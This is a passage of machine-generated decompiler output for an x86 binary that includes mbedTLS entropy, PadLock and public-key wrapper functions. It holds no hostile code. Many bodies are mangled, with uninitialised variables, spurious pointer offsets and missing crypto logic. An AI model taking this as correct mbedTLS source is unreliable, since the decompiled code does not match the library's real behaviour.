        // branch -> 0x804c4d0
    }
    int32_t v9 = 0x1000000 * v6 / 0x1000000;
    g6 = &v9;
    g1 = mbedtls_sha512_update((char *)v2, (char *)&v9, 2);
    mbedtls_sha512_update((char *)g3, (char *)g7, g5);
    g3 = v1;
    g1 = 0;
    g7 = v3;
    g5 = v5;
    int32_t v10;
    g2 = v10;
    return 0;
}

// Address range: 0x804c510 - 0x804c5fc
int32_t entropy_gather_internal(int32_t a1) {
    int32_t v1;
    g2 = &v1;
    int32_t v2 = g5; // 0x804c513
    g5 = -64;
    int32_t v3 = g7; // 0x804c519
    int32_t v4 = g3; // 0x804c51a
    int32_t v5 = g1; // 0x804c521
    int32_t * v6 = (int32_t *)(v5 + 212); // 0x804c521_0
    int32_t v7 = *v6; // 0x804c521
    int32_t result; // 0x804c5f6
    if (v7 == 0) {
        result = -64;
        // 0x804c5f0
        g1 = result;
        g3 = v4;
        g7 = v3;
        g5 = v2;
        g2 = v1;
        return result;
    }
    // 0x804c534
    if (v7 < 1) {
        // 0x804c5ea
        result = -61;
        // branch -> 0x804c5f0
        // 0x804c5f0
        g1 = result;
        g3 = v4;
        g7 = v3;
        g5 = v2;
        g2 = v1;
        return result;
    }
    // 0x804c53a
    g3 = v5;
    g7 = 0;
    int32_t v8;
    int32_t v9 = &v8; // 0x804c577_0
    int32_t v10;
    int32_t v11 = &v10; // 0x804c584_0
    int32_t v12 = v5; // 0x804c5a6
    int32_t v13 = 0; // 0x804c5e011
    // branch -> 0x804c564
    int32_t v14; // 0x804c5e011
    while (true) {
        int32_t v15 = *(int32_t *)(v12 + 232); // 0x804c564
        g237 = v15 == 1;
        v14 = v15 == 1 ? 1 : v13;
        g4 = v9;
        int32_t v16 = *(int32_t *)(v12 + 220); // 0x804c596
        g1 = v16;
        v8 = 0;
        ((int32_t (*)(int32_t, int32_t, int32_t, int32_t))*(int32_t *)(v12 + 216))(v16, v11, 128, v9);
        int32_t v17 = g1; // 0x804c5ac
        g5 = v17;
        if (v17 == 0) {
            int32_t v18 = v8; // 0x804c5b2
            if (v18 != 0) {
                // 0x804c5b9
                g1 = v5;
                g6 = g7 % 256;
                g4 = v11;
                entropy_update(v18, v11, 128, v9);
                int32_t * v19 = (int32_t *)(g3 + 224); // 0x804c5d5_0
                *v19 = *v19 + v8;
                // branch -> 0x804c550
            }
            int32_t v20 = g7 + 1; // 0x804c556
            g7 = v20;
            int32_t v21 = g3 + 20; // 0x804c559
            g3 = v21;
            if (*v6 <= v20) {
                // break -> 0x804c5e0
                break;
            }
            v12 = v21;
            v13 = v14;
            // continue -> 0x804c564
            continue;
        }
    }
    // 0x804c5e0
    if (v14 == 0) {
        // 0x804c5ea
        result = -61;
        // branch -> 0x804c5f0
    } else {
        // 0x804c5e0
        result = g5;
        // branch -> 0x804c5f0
    }
    // 0x804c5f0
    g1 = result;
    g3 = v4;
    g7 = v3;
    g5 = v2;
    g2 = v1;
    return result;
}

// Address range: 0x804c5fd - 0x804c5ff
int32_t function_804c5fd(int32_t a1) {
    // 0x804c5fd
    return g7;
}

// Address range: 0x804c600 - 0x804c60f
int32_t mbedtls_entropy_gather(int32_t a1, int32_t a2) {
    // 0x804c600
    g1 = a1;
    int32_t v1;
    return entropy_gather_internal(v1);
}

// Address range: 0x804c610 - 0x804c62f
int32_t mbedtls_entropy_update_manual(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x804c610
    g1 = a1;
    g4 = a2;
    g6 = 20;
    int32_t v1;
    int32_t v2;
    entropy_update(v2, v1, a3, a2);
    return 0;
}

// Address range: 0x804c630 - 0x804c78f
int32_t mbedtls_entropy_func(char * a1, int32_t a2, uint32_t a3) {
    int32_t v1 = g5; // 0x804c633
    int32_t v2 = g7; // 0x804c634
    int32_t v3 = g3; // 0x804c635
    g3 = 0;
    if (a3 > 64) {
        // 0x804c630
        // branch -> 0x804c77d
        // 0x804c77d
        g1 = -60;
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return g4;
    }
    // 0x804c64c
    g1 = (int32_t)a1;
    int32_t v4;
    int32_t v5 = entropy_gather_internal(v4); // 0x804c64f
    int32_t v6 = v5;
    if (v5 == 0) {
        int32_t v7 = 1; // 0x804c6a519
        while (true) {
            int32_t v8 = (int32_t)a1;
            uint32_t v9 = *(int32_t *)(v8 + 212); // 0x804c663
            g5 = v9;
            if (v9 >= 1) {
                // 0x804c66d
                g4 = 1;
                int32_t v10 = 1; // 0x804c69123
                int32_t v11 = 0; // 0x804c687
                int32_t v12 = v8; // 0x804c68a
                // branch -> 0x804c678
                int32_t v13; // 0x804c691
                while (true) {
                    uint32_t v14 = *(int32_t *)(v12 + 224); // 0x804c678
                    g7 = v14;
                    v13 = v10;
                    if (v14 < *(int32_t *)(v12 + 228)) {
                        int32_t v15 = g3; // 0x804c684
                        g4 = v15;
                        v13 = v15;
                        // branch -> after_if_804c684_0
                    }
                    int32_t v16 = v11 + 1; // 0x804c687
                    g6 = v16;
                    int32_t v17 = v12 + 20; // 0x804c68a
                    if (v16 == v9) {
                        // break -> 0x804c691
                        break;
                    }
                    v10 = v13;
                    v11 = v16;
                    v12 = v17;
                    // continue -> 0x804c678
                }
                // 0x804c691
                if (v13 == 0) {
                    // 0x804c695
                    if (v7 == 257) {
                        // 0x804c77d
                        // branch -> 0x804c77d
                        // 0x804c77d
                        g1 = -60;
                        g3 = v3;
                        g7 = v2;
                        g5 = v1;
                        return 0;
                    }
                    // 0x804c6a2
                    g1 = v8;
                    int32_t v18 = entropy_gather_internal((int32_t)(char *)v4); // 0x804c6a9
                    if (v18 != 0) {
                        v6 = v18;
                        // break -> 0x804c6b5
                        break;
                    }
                    v7++;
                    // continue -> 0x804c660
                    continue;
                }
            }
            // 0x804c6c0
            int32_t v19;
            int32_t v20 = &v19; // 0x804c6c0_0
            g3 = v20;
            g7 = 0;
            g5 = v20;
            memset((char *)&v19, 0, 16);
            int32_t v21;
            mbedtls_sha512_finish((int32_t *)a1, (char *)g3, v21);
            g5 = (int32_t)a1;
            memset(a1, g7, 53);
            mbedtls_sha512_starts((int32_t *)a1, 0);
            g1 = (int32_t)a1;
            mbedtls_sha512_update(a1, (char *)g3, 64);
            int32_t v22 = g3; // 0x804c71d
            mbedtls_sha512(v22, 64, v22, 0);
            int32_t v23 = (int32_t)a1;
            int32_t v24 = *(int32_t *)(v23 + 212); // 0x804c734
            if (v24 < 1) {
                // 0x804c75c
                memcpy((char *)a2, (char *)g3, a3);
                g1 = 0;
                g3 = v3;
                g7 = v2;
                g5 = v1;
                return g4;
            }
            // 0x804c73e
            g4 = v23;
            *(int32_t *)(v23 + 224) = 0;
            int32_t v25 = g4 + 20; // 0x804c755
            g4 = v25;
            int32_t v26 = 1; // 0x804c758
            // branch -> 0x804c748
            while (v26 < v24) {
                // 0x804c748
                *(int32_t *)(v25 + 224) = 0;
                v25 = g4 + 20;
                g4 = v25;
                v26++;
                // continue -> 0x804c748
            }
            // 0x804c75c
            // branch -> 0x804c75c
            // 0x804c75c
            memcpy((char *)a2, (char *)g3, a3);
            g1 = 0;
            g3 = v3;
            g7 = v2;
            g5 = v1;
            return g4;
        }
    }
    // 0x804c6b5
    g1 = v6;
    g3 = v3;
    g7 = v2;
    g5 = v1;
    return g4;
}

// Address range: 0x804c790 - 0x804c92f
int32_t mbedtls_entropy_self_test(int32_t a1) {
    int32_t v1 = g5; // 0x804c79a
    int32_t v2 = g7; // 0x804c79b
    int32_t v3;
    int32_t v4 = &v3; // 0x804c79c_0
    g7 = v4;
    int32_t v5 = g3; // 0x804c79f
    g5 = v4;
    memset((char *)&v3, 0, 16);
    if (a1 != 0) {
        // 0x804c8a8
        printf("  ENTROPY test: ");
        // branch -> 0x804c7b5
    }
    // 0x804c7b5
    int32_t v6;
    int32_t v7 = &v6; // 0x804c7b5_0
    int32_t v8;
    g3 = &v8;
    mbedtls_entropy_init((char *)&v6);
    g1 = v7;
    int32_t v9 = entropy_gather_internal((int32_t)(char *)&v6); // 0x804c7cf
    g1 = v9;
    int32_t v10; // 0x804c7fb
    int32_t v11; // edi
    int32_t result; // 0x804c82f
    if (v9 == 0) {
        // 0x804c7dc
        v11 = 1;
        g1 = -62;
        int32_t v12;
        if (v12 < 20) {
            int32_t v13 = 20 * v12; // 0x804c839
            g5 = v7;
            *(int32_t *)(v13 - 540 + g2) = 16;
            *(int32_t *)(g2 - 536 + v13) = 0;
            *(int32_t *)(g2 - 552 + v13) = 0x804c390;
            *(int32_t *)(g2 - 548 + v13) = 0;
            mbedtls_entropy_update_manual(v7, g7, 64, 0, 0);
            g4 = (int32_t)memset((char *)&v8, 0, 16);
            int32_t v14;
            g5 = &v14;
            // branch -> 0x804c8c4
            while (true) {
                // 0x804c8c4
                mbedtls_entropy_func((char *)&v6, g7, 64);
                if (g1 == 0) {
                    // 0x804c8e2
                    g6 = 0;
                    int32_t v15 = 0; // 0x804c8ec
                    unsigned char v16 = *(char *)(g7 + v15); // 0x804c8e8
                    g4 = v16;
                    char * v17 = (char *)(g3 + v15); // 0x804c8ec_0
                    *v17 = *v17 | v16;
                    int32_t v18 = g6 + 1; // 0x804c8ef
                    g6 = v18;
                    // branch -> 0x804c8e8
                    while (v18 != 64) {
                        // 0x804c8e8
                        v15 = v18;
                        v16 = *(char *)(g7 + v15);
                        g4 = v16;
                        v17 = (char *)(g3 + v15);
                        *v17 = *v17 | v16;
                        v18 = g6 + 1;
                        g6 = v18;
                        // continue -> 0x804c8e8
                    }
                    int32_t v19 = g5 + 1; // 0x804c8f7
                    g5 = v19;
                    if (v19 == 8) {
                        // break -> 0x804c8ff
                        break;
                    }
                    // continue -> 0x804c8c4
                    continue;
                } else {
                    // 0x804c88d
                    v11 = 1;
                    // branch -> 0x804c7f1
                }
                // 0x804c7f1
                *(char *)v7 = 0;
                v10 = v7 + 1;
                // branch -> 0x804c7f8
                while (v10 != g3) {
                    // 0x804c7f8
                    *(char *)v10 = 0;
                    v10++;
                    // continue -> 0x804c7f8
                }
                // 0x804c802
                if (a1 == 0) {
                    // 0x804c829
                    result = v11;
                    g1 = result;
                    g3 = v5;
                    g7 = v2;
                    g5 = v1;
                    return result;
                }
                // 0x804c809
                if (g1 == 0) {
                    // 0x804c811
                    puts("passed");
                    // branch -> 0x804c81d
                    // 0x804c81d
                    putchar(10);
                    // branch -> 0x804c829
                    // 0x804c829
                    result = v11;
                    g1 = result;
                    g3 = v5;
                    g7 = v2;
                    g5 = v1;
                    return result;
                }
                // 0x804c897
                puts("failed");
                // branch -> 0x804c81d
                // 0x804c81d
                putchar(10);
                // branch -> 0x804c829
                // 0x804c829
                result = v11;
                g1 = result;
                g3 = v5;
                g7 = v2;
                g5 = v1;
                return result;
            }
        }
    } else {
        // 0x804c88d
        v11 = 1;
        // branch -> 0x804c7f1
    }
    // 0x804c7f1
    *(char *)v7 = 0;
    v10 = v7 + 1;
    // branch -> 0x804c7f8
    while (v10 != g3) {
        // 0x804c7f8
        *(char *)v10 = 0;
        v10++;
        // continue -> 0x804c7f8
    }
    // 0x804c802
    if (a1 == 0) {
        // 0x804c829
        result = v11;
        g1 = result;
        g3 = v5;
        g7 = v2;
        g5 = v1;
        return result;
    }
    // 0x804c809
    if (g1 == 0) {
        // 0x804c811
        puts("passed");
        // branch -> 0x804c81d
    } else {
        // 0x804c897
        puts("failed");
        // branch -> 0x804c81d
    }
    // 0x804c81d
    putchar(10);
    // branch -> 0x804c829
    // 0x804c829
    result = v11;
    g1 = result;
    g3 = v5;
    g7 = v2;
    g5 = v1;
    return result;
}

// Address range: 0x804cb90 - 0x804cbd6
int32_t mbedtls_padlock_has_support(int32_t a1, int32_t a2) {
    int32_t v1 = g191; // 0x804cb96
    int32_t v2 = v1; // 0x804cbd2
    if (v1 == -1) {
        // 0x804cba0
        g191 = 0;
        v2 = 0;
        // branch -> 0x804cbd2
    }
    // 0x804cbd2
    return v2 & a1;
}

// Address range: 0x804cbd7 - 0x804cbdf
int32_t function_804cbd7(int32_t a1) {
    // 0x804cbd7
    return g7;
}

// Address range: 0x804cbe0 - 0x804ccbf
int32_t mbedtls_padlock_xcryptcbc(int32_t * a1, int32_t a2, int32_t a3, int32_t * a4, int32_t * a5, int32_t * a6) {
    int32_t v1 = (int32_t)a4;
    int32_t result = -48;
    if ((char)(int32_t)a5 == 15) {
        // 0x804cc10
        if ((char)(int32_t)a6 == 15) {
            int32_t v2 = *(int32_t *)((int32_t)a1 + 4); // 0x804cc16
            g4 = (a3 + 15) / 16;
            char * v3 = (char *)(v2 + 0x458bf05d); // 0x804cc90_0
            uint32_t v4 = (int32_t)*v3; // 0x804cc90
            *v3 = (char)(v4 / 2 % 128 | 128 * v4);
            *(int32_t *)v2 = *a4;
            *(int32_t *)(v2 + 4) = *(int32_t *)(v1 + 4);
            *(int32_t *)(v2 + 8) = *(int32_t *)(v1 + 8);
            *(int32_t *)(v2 + 12) = *(int32_t *)(v1 + 12);
            result = 0;
            // branch -> 0x804cc03
        } else {
            result = -48;
        }
    }
    // 0x804cc03
    return result;
}

// Address range: 0x804ccc0 - 0x804cd6f
int32_t mbedtls_padlock_xcryptecb(int32_t * a1, int32_t a2, int32_t * a3, int32_t * a4) {
    int32_t v1 = (int32_t)a3;
    int32_t v2 = (int32_t)a4; // eax
    int32_t v3 = *(int32_t *)(v1 + 8); // 0x804ccfc
    *a4 = *a3;
    *(int32_t *)(v2 + 4) = *(int32_t *)(v1 + 4);
    g4 = v3;
    *(int32_t *)(v2 + 8) = v3;
    *(int32_t *)(v2 + 12) = *(int32_t *)(v1 + 12);
    return 0;
}

// Address range: 0x804cd70 - 0x804cd8f
int32_t mbedtls_pk_init(int32_t * a1) {
    int32_t result = (int32_t)a1;
    if (a1 != NULL) {
        // 0x804cd7a
        *a1 = 0;
        *(int32_t *)(result + 4) = 0;
        // branch -> 0x804cd87
    }
    // 0x804cd87
    return result;
}

// Address range: 0x804cd90 - 0x804cdcf
int32_t mbedtls_pk_free(char * a1) {
    int32_t v1;
    g2 = &v1;
    int32_t v2 = g3; // 0x804cd93
    int32_t v3 = (int32_t)a1;
    g3 = v3;
    if (a1 == NULL) {
        // 0x804cd90
        // branch -> 0x804cdc2
        // 0x804cdc2
        g3 = v2;
        return g1;
    }
    int32_t v4 = *(int32_t *)a1; // 0x804cd9e
    g1 = v4;
    g237 = v4 == 0;
    int32_t result; // 0x804cdc7_2
    if (v4 != 0) {
        int32_t v5 = *(int32_t *)(v3 + 4); // 0x804cda4
        g6 = v5;
        ((int32_t (*)(int32_t))*(int32_t *)(v4 + 40))(v5);
        g6 = g3 + 8;
        *(char *)g3 = 0;
        int32_t v6 = g3 + 1; // 0x804cdbb
        // branch -> 0x804cdb8
        while (v6 != g6) {
            // 0x804cdb8
            *(char *)v6 = 0;
            v6++;
            // continue -> 0x804cdb8
        }
        // 0x804cdc2
        result = v6;
        // branch -> 0x804cdc2
    } else {
        result = 0;
    }
    // 0x804cdc2
    g3 = v2;
    return result;
}

// Address range: 0x804cdd0 - 0x804cdef
int32_t mbedtls_pk_info_from_type(int32_t a1) {
    // 0x804cdd0
    g1 = 0;
    int32_t v1 = a1 - 1; // 0x804cdd8
    g6 = v1;
    int32_t result; // 0x804cde0
    if (v1 <= 3) {
        // 0x804cde0
        result = *(int32_t *)(4 * v1 + (int32_t)&g19);
        g1 = result;
        // branch -> 0x804cde7
    } else {
        result = 0;
    }
    // 0x804cde7
    return result;
}

// Address range: 0x804cdf0 - 0x804ce3f
int32_t mbedtls_pk_setup(int32_t * a1, int32_t a2) {
    int32_t v1;
    g2 = &v1;
    int32_t v2 = g3; // 0x804cdf6
    g3 = a2;
    int32_t v3 = g7; // 0x804cdfc
    g7 = (int32_t)a1;
    if (a2 == 0) {
        // 0x804ce07
        // branch -> 0x804ce0c
        // 0x804ce0c
        g3 = v2;
        g7 = v3;
        return -0x3e80;
    }
    // 0x804ce18
    if (a1 != NULL) {
        int32_t v4 = *a1; // 0x804ce1c
        g1 = v4;
        g237 = v4 == 0;
        if (v4 == 0) {
            // 0x804ce22
            ((int32_t (*)())*(int32_t *)(a2 + 36))();
            g6 = g1;
            *(int32_t *)(g7 + 4) = g1;
            int32_t result; // 0x804ce16_2
            if (g1 != 0) {
                // 0x804ce33
                *(int32_t *)g7 = g3;
                result = 0;
                // branch -> 0x804ce0c
            } else {
                result = -0x3f80;
            }
            // 0x804ce0c
            g3 = v2;
            g7 = v3;
            return result;
        }
    }
    // 0x804ce07
    // branch -> 0x804ce0c
    // 0x804ce0c
    g3 = v2;
    g7 = v3;
    return -0x3e80;
}

// Address range: 0x804ceca - 0x804cecf
int32_t function_804ceca(int32_t a1) {
    // 0x804ceca
    return g5;
}

// Address range: 0x804ced0 - 0x804cf3f
int32_t mbedtls_pk_decrypt(int32_t * a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x804ced0
    if (a1 == NULL) {
        // 0x804cef8
        // branch -> 0x804cefd
        // 0x804cefd
        return -0x3e80;
    }
    int32_t v1 = *a1; // 0x804cf10
    if (v1 == 0) {
        // 0x804cef8
        // branch -> 0x804cefd
        // 0x804cefd
        return -0x3e80;
    }
    int32_t v2 = *(int32_t *)(v1 + 24); // 0x804cf16
    g4 = v2;
    g237 = v2 == 0;
    if (v2 == 0) {
        // 0x804cefd
        return -0x3f00;
    }
    int32_t result = *(int32_t *)((int32_t)a1 + 4); // 0x804cf28
    g1 = result;
    g6 = v2;
    int32_t v3;
    g2 = v3;
    ((int32_t (*)(int32_t))v2)(result);
    return result;
}

// Address range: 0x804cf40 - 0x804cfaf
int32_t mbedtls_pk_encrypt(int32_t * a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x804cf40
    if (a1 == NULL) {
        // 0x804cf68
        // branch -> 0x804cf6d
        // 0x804cf6d
        return -0x3e80;
    }
    int32_t v1 = *a1; // 0x804cf80
    if (v1 == 0) {
        // 0x804cf68
        // branch -> 0x804cf6d
        // 0x804cf6d
        return -0x3e80;
    }
    int32_t v2 = *(int32_t *)(v1 + 28); // 0x804cf86
    g237 = v2 == 0;
    if (v2 == 0) {
        // 0x804cf6d
        return -0x3f00;
    }
    int32_t result = *(int32_t *)((int32_t)a1 + 4); // 0x804cf98
    g1 = result;
    g6 = v2;
    int32_t v3;
    g2 = v3;
    ((int32_t (*)(int32_t))v2)(result);
    return result;
}

// Address range: 0x804d04a - 0x804d04f
int32_t function_804d04a(int32_t a1) {
    // 0x804d04a
    return g5;
}

// Address range: 0x804d08d - 0x804d08f
int32_t function_804d08d(int32_t a1) {
    // 0x804d08d
    return g7;
}

// Address range: 0x804d0d0 - 0x804d10f
int32_t pk_hashlen_helper(void) {
    int32_t v1 = g6; // 0x804d0d6
    int32_t * v2 = (int32_t *)v1; // 0x804d0d6_0
    int32_t v3 = *v2; // 0x804d0d6
    g4 = v3;
    int32_t v4;
    if (v3 != 0) {
        // 0x804d0dc
        g1 = 0;
        // branch -> 0x804d0de
        // 0x804d0de
        g2 = v4;
        return 0;
    }
    int32_t v5 = mbedtls_md_info_from_type(g1); // 0x804d0e6
    g4 = v5;
    g1 = -1;
    int32_t result; // 0x804d0df_2
    if (v5 != 0) {
        uint32_t v6 = mbedtls_md_get_size(v5); // 0x804d0f9
        g6 = v1;
        *v2 = v6 % 256;
        g1 = 0;
        result = 0;
        // branch -> 0x804d0de
    } else {
        result = -1;
    }
    // 0x804d0de
    g2 = v4;
    return result;
}

// Address range: 0x804d370 - 0x804d38f
int32_t rsa_can_do(int32_t a1, int32_t a2) {
    // 0x804d370
    return (int32_t)(bool)(a1 == 1) | (int32_t)(bool)(a1 == 6);
}

// Address range: 0x804d390 - 0x804d39f
int32_t rsa_get_bitlen(int32_t a1) {
    int32_t result = 8 * *(int32_t *)(a1 + 4); // 0x804d39a
    g1 = result;
    return result;
}

// Address range: 0x804d3e0 - 0x804d3f9
int32_t eckey_can_do(int32_t a1) {
    int32_t result = (bool)(a1 == 4 | (a1 & -2) == 2); // 0x804d3ed
    g1 = result;
    return result;
}

// Address range: 0x804d3fa - 0x804d3ff
int32_t function_804d3fa(int32_t a1) {
    // 0x804d3fa
    return g5;
}

// Address range: 0x804d400 - 0x804d40f
int32_t eckey_get_bitlen(int32_t a1) {
    int32_t result = *(int32_t *)(a1 + 88); // 0x804d407
    g1 = result;
    return result;
}

// Address range: 0x804d45a - 0x804d45f
int32_t function_804d45a(int32_t a1) {
    // 0x804d45a
    return g5;
}

// Address range: 0x804d460 - 0x804d46f
int32_t ecdsa_can_do(int32_t a1) {
    int32_t result = (bool)(a1 == 4); // 0x804d46a
    g1 = result;
    return result;
}

// Address range: 0x804d470 - 0x804d47f
int32_t rsa_alt_can_do(int32_t a1) {
    int32_t result = (bool)(a1 == 1); // 0x804d47a
    g1 = result;
    return result;
}

// Address range: 0x804d480 - 0x804d495
int32_t rsa_alt_get_bitlen(int32_t * a1) {
    int32_t v1 = (int32_t)a1;
    int32_t v2;
    g2 = &v2;
    g237 = &v2 == (int32_t *)24;
    g1 = v1;
    int32_t v3 = *a1; // 0x804d489
    g6 = v3;
    ((int32_t (*)(int32_t))*(int32_t *)(v1 + 12))(v3);
    return 8 * g1;
}

// Address range: 0x804d496 - 0x804d49f
int32_t function_804d496(int32_t a1) {
    // 0x804d496
    return g7;
}

// Address range: 0x804d4a0 - 0x804d51f
int32_t rsa_alt_sign_wrap(int32_t * a1, int32_t a2, int32_t a3, int32_t * a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11, int32_t a12) {
    int32_t v1 = (int32_t)a1;
    int32_t v2 = (int32_t)a4;
    int32_t v3;
    g2 = &v3;
    g237 = &v3 == (int32_t *)72;
    int32_t v4 = g3; // 0x804d4a9
    g3 = v1;
    int32_t v5 = g7; // 0x804d4af
    g4 = v2;
    int32_t v6 = g5; // 0x804d4b5
    g6 = a6;
    g7 = a3;
    g5 = a5;
    int32_t v7 = *a1; // 0x804d4d6
    g1 = v7;
    ((int32_t (*)(int32_t))*(int32_t *)(v1 + 12))(v7);
    g6 = a6;
    g4 = v2;
    *(int32_t *)a6 = g1;
    g5 = v6;
    g7 = v5;
    int32_t v8 = g3; // 0x804d50e
    int32_t result = *(int32_t *)(v8 + 8); // 0x804d513
    g1 = result;
    g3 = v4;
    g2 = v3;
    ((int32_t (*)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t, int32_t, int32_t))result)(*(int32_t *)v8, a7, a8, 1, a2, v2, a3, a5);
    return result;
}

// Address range: 0x804d610 - 0x804d62f
int32_t ecdsa_free_wrap(int32_t a1, int32_t a2, int32_t a3) {
    // 0x804d610
    int32_t v1;
    char * v2 = (char *)v1; // bp-4
    int32_t result = g3; // bp-8
    g3 = a1;
    g1 = mbedtls_ecdsa_free();
    g3 = result;
    g2 = (int32_t)v2;
    free(v2);
    return result;
}

// Address range: 0x804d680 - 0x804d6bf
int32_t ecdsa_verify_wrap(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x804d680
    int32_t v1;
    int32_t v2 = mbedtls_ecdsa_read_signature(a1, a3, a4, a5, v1); // 0x804d6a8
    int32_t result = v2; // 0x804d6bb_2
    if (v2 == -0x4c00) {
        // if_804d6b8_0_true
        result = -0x3900;
        // branch -> after_if_804d6b8_0
    }
    // after_if_804d6b8_0
    return result;
}

// Address range: 0x804d6c0 - 0x804d6df
int32_t eckey_free_wrap(int32_t a1, int32_t a2, int32_t a3) {
    // 0x804d6c0
    int32_t v1;
    char * v2 = (char *)v1; // bp-4
    int32_t v3 = g3; // 0x804d6c3
    g3 = a1;
    int32_t result = mbedtls_ecp_keypair_free(a1); // 0x804d6cd
    g1 = result;
    g3 = v3;
    g2 = (int32_t)v2;
    free(v2);
    return result;
}

// Address range: 0x804d730 - 0x804d7ac
int32_t eckey_sign_wrap(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    int32_t v1;
    g3 = &v1;
    mbedtls_ecdsa_init();
    int32_t v2 = mbedtls_ecdsa_from_keypair(g3, a1); // 0x804d753
    g1 = v2;
    g7 = v2;
    if (v2 == 0) {
        int32_t v3 = mbedtls_ecdsa_write_signature((char *)g3, a2, a3, a4, a5, (int32_t *)a6); // 0x804d792
        g1 = v3;
        g7 = v3;
        // branch -> 0x804d799
    }
    // 0x804d799
    mbedtls_ecdsa_free();
    return g7;
}

// Address range: 0x804d7ad - 0x804d7af
int32_t function_804d7ad(int32_t a1) {
    // 0x804d7ad
    return g7;
}

// Address range: 0x804d7b0 - 0x804d82f
int32_t eckey_verify_wrap(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    int32_t v1 = g3; // 0x804d7b9
    int32_t v2;
    g3 = &v2;
    int32_t v3 = g7; // 0x804d7c2
    mbedtls_ecdsa_init();
    int32_t v4 = mbedtls_ecdsa_from_keypair(g3, a1); // 0x804d7d7
    g1 = v4;
    g7 = v4;
    if (v4 == 0) {
        int32_t v5 = ecdsa_verify_wrap(g3, a2, a3, a4, a5); // 0x804d808
        g1 = v5;
        g7 = v5;
        // branch -> 0x804d80f
    }
    // 0x804d80f
    mbedtls_ecdsa_free();
    int32_t result = g7; // 0x804d817
    g1 = result;
    g3 = v1;
    g7 = v3;
    int32_t v6;
    g2 = v6;
    return result;
}

// Address range: 0x804d830 - 0x804d84f
int32_t rsa_free_wrap(int32_t a1, int32_t a2, int32_t a3) {
    // 0x804d830
    int32_t v1;
    char * v2 = (char *)v1; // bp-4
    int32_t v3 = g3; // 0x804d833
    g3 = a1;
    int32_t result = mbedtls_rsa_free(a1, 0); // 0x804d83d
    g1 = result;
    g3 = v3;
    g2 = (int32_t)v2;
    free(v2);
    return result;
}

// Address range: 0x804d930 - 0x804d9af
int32_t rsa_decrypt_wrap(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    // 0x804d930
    if (*(int32_t *)(a1 + 4) != a3) {
        // 0x804d962
        return -0x4080;
    }
    // 0x804d978
    int32_t v1;
    int32_t v2;
    return mbedtls_rsa_pkcs1_decrypt(v2, v1, a1, a7, a8, 1, a5, a2, a4, a6, 0, 0);
}

// Address range: 0x804da10 - 0x804da8f
int32_t rsa_verify_wrap(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, uint32_t a6) {
    // 0x804da10
    g1 = -0x4380;
    int32_t v1 = g3; // 0x804da1b
    g3 = a1;
    int32_t v2 = g7; // 0x804da21
    g7 = a6;
    int32_t v3;
    if (*(int32_t *)(a1 + 4) > a6) {
        // 0x804da2c
        g3 = v1;
        g7 = v2;
        g2 = v3;
        return -0x4380;
    }
    int32_t v4 = mbedtls_rsa_pkcs1_verify(a1, 0, 0, 0, a2, a4, a3, a5); // 0x804da6f
    g1 = v4;
    int32_t result = v4; // 0x804da35_2
    if (v4 == 0) {
        // 0x804da78
        if (g7 > *(int32_t *)(g3 + 4)) {
            // if_804da80_0_true
            g1 = -0x3900;
            result = -0x3900;
            // branch -> 0x804da2c
        } else {
            result = 0;
        }
    }
    // 0x804da2c
    g3 = v1;
    g7 = v2;
    g2 = v3;
    return result;
}

// Address range: 0x804da90 - 0x804db9f
int32_t rsa_alt_check_pair(int32_t a1, int32_t a2) {
    int32_t v1 = g3; // 0x804da99
    g3 = a2;
    int32_t v2 = g7; // 0x804da9f
    g7 = a1;
    int32_t v3 = 0; // bp-32
    int32_t v4 = rsa_alt_get_bitlen((int32_t *)a2); // 0x804dab2
    int32_t result; // 0x804dac6
    if (v4 == 8 * *(int32_t *)(g7 + 4)) {
        // 0x804dad8
        int32_t v5;
        int32_t v6 = &v5; // 0x804dad8_0
        int32_t v7 = &v3; // 0x804dade_0
        int32_t v8;
        int32_t v9 = &v8; // 0x804dae1_0
        g5 = v9;
        v8 = 0x2a2a2a2a;
        int32_t v10 = rsa_alt_sign_wrap((int32_t *)g3, 0, v9, (int32_t *)32, v6, v7, 0, 0, 0, 0, 0, v6); // 0x804db51
        g3 = v7;
        if (v10 == 0) {
            // 0x804db66
            if (rsa_verify_wrap(g7, 0, g5, 32, v6, v3) == 0) {
                // 0x804db66
                result = g3;
                // branch -> 0x804dac6
            } else {
                // 0x804dac1
                result = -0x4200;
                // branch -> 0x804dac6
            }
            // 0x804dac6
            g7 = v2;
            g3 = v1;
            return result;
        }
        result = v7;
    } else {
        // 0x804dac1
        result = -0x4200;
        // branch -> 0x804dac6
    }
    // 0x804dac6
    g7 = v2;
    g3 = v1;
    return result;
}

// Address range: 0x804dba0 - 0x804dc3f
int32_t pk_get_pk_alg(int32_t * a1, int32_t a2, int32_t a3) {
    int32_t v1 = g3; // 0x804dba6
    g3 = (int32_t)a1;
    int32_t v2 = g7; // 0x804dbac
    int32_t v3;
    g7 = &v3;
    int32_t v4 = g5; // 0x804dbb2
    g5 = g4;
    *a1 = 0;
    *(int32_t *)(g3 + 4) = 0;
    *(int32_t *)(g3 + 8) = 0;
    int32_t v5 = mbedtls_asn1_get_alg((int32_t *)g1, g6, (int32_t *)g7, (char *)g3); // 0x804dbda
    int32_t result; // 0x804dbf4_2
    if (v5 == 0) {
        int32_t v6 = mbedtls_oid_get_pk_alg(g7, (int32_t *)g5); // 0x804dbff
        g6 = v6;
        if (v6 == 0) {
            // 0x804dc0f
            if (*(int32_t *)g5 != 1) {
                // 0x804dc14
                // branch -> 0x804dbe8
                // 0x804dbe8
                g3 = v1;
                g7 = v2;
                g5 = v4;
                return 0;
            }
            int32_t v7 = *(int32_t *)g3; // 0x804dc18
            if (v7 != 0) {
                // 0x804dc1e
                if (v7 != 5) {
                    // 0x804dc23
                    // branch -> 0x804dbe8
                    // 0x804dbe8
                    g3 = v1;
